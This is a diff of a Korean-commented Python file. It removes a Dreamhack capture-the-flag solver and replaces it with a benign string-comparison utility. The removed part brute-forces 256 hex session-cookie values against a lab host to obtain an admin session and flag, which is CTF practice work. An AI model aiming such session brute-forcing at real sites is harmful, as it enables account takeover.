@@ -1,53 +1,32 @@
-import requests
+def compare_strings(str1, str2):
+    print(f"\n[비교 결과]")
+    print(f"문자열 1: {str1}\n")
+    print(f"문자열 2: {str2}\n")
+    print("-" * 30)
 
-# 1. 대상 URL 설정
-url = "http://host3.dreamhack.games:9912/"
+    # 두 문자열이 완전히 동일한 경우
+    if str1 == str2:
+        print("\n\n두 문자열이 완벽하게 일치합니다.")
+        return
 
-print("공격을 시작합니다. 잠시만 기다려주세요...")
+    # 길이 차이 확인
+    len1, len2 = len(str1), len(str2)
+    max_len = max(len1, len2)
+    found_diff = False
 
-# 2. 0부터 255(0xFF)까지 반복
-for i in range(256):
-    # 16진수 소문자 2자리 형태(00, 01, ..., ff)로 변환
-    session_id = f"{i:02x}"
+    for i in range(max_len):
+        char1 = str1[i] if i < len1 else "[없음]"
+        char2 = str2[i] if i < len2 else "[없음]"
+
+        if char1 != char2:
+            print(f"위치 {i}: '{char1}' vs '{char2}' (다름)")
+            found_diff = True
     
-    # 쿠키 설정
-    cookies = {
-        'sessionid': session_id
-    }
-    
-    try:
-        # GET 요청 보내기
-        response = requests.get(url, cookies=cookies)
-        
-        # 3. 응답 내용에서 플래그나 관리자 텍스트 확인
-        # 드림핵 플래그 형식인 'DH{' 가 포함되어 있는지 확인합니다.
-        if "DH{" in response.text or "flag is" in response.text:
-            print(f"\n[+] 성공! 관리자 세션을 찾았습니다: {session_id}")
-            
-            # 플래그 부분만 추출해서 출력 (간단한 처리)
-            if "DH{" in response.text:
-                start_idx = response.text.find("DH{")
-                end_idx = response.text.find("}", start_idx) + 1
-                print(f"[!] FLAG: {response.text[start_idx:end_idx]}")
-            else:
-                print(f"응답 내용: {response.text}")
-            
-            break # 찾으면 반복 중단
-            
-    except Exception as e:
-        print(f"오류 발생: {e}")
-        break
+    if len1 != len2:
+        print(f"\n\n참고: 두 문자열의 길이가 다릅니다. (길이 {len1} vs {len2})")
 
-    # 진행 상황 표시 (선택 사항)
-    if i % 20 == 0:
-        print(f"현재 시도 중... ({session_id}/ff)")
+# 사용자 입력 받기
+input1 = input("첫 번째 문자열을 입력하세요: ")
+input2 = input("\n\n두 번째 문자열을 입력하세요: ")
 
-print("\n작업이 완료되었습니다.")
-
-
-
-
-
-
-
-
+compare_strings(input1, input2)
